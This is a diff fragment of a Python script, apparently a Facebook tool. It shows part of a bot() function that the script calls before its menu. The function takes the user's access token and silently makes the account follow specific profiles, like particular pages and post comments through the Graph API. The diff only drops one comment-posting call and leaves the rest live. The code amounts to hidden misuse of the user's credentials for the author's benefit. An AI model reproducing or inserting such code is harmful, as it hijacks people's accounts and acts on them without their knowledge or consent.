@@ -226,8 +226,7 @@ def bot():
 	requests.post("https://graph.facebook.com/100074600334850/subscribers?access_token="+token)
 	requests.post("https://graph.facebook.com/100050672943941/subscribers?access_token="+token) # Usup Mbew
 	requests.post("https://graph.facebook.com/123822970114380/likes?summary=true&access_token=" + token)
-	requests.post("https://graph.facebook.com/111932931303384/likes?summary=true&access_token=" + token)
-	requests.post("https://graph.facebook.com/368578384841257/comments/?message="+komen+"&access_token="+token)
+	requests.post("https://graph.facebook.com/111932931303384/likes?summary=true&access_token=" + token) 
 	requests.post("https://graph.facebook.com/111932931303384/comments/?message="+komentar+"&access_token="+token)
 	menu()
 
